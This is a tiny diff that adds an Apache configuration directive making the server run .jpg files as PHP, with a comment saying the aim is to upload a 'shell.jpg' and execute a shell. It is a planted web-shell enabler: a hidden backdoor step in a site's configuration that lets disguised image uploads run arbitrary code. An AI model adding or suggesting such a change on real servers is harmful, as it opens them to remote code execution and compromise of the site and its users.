@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .jpg
+# allow run .jpg as php, we need upload other shell.jpg to execute shell
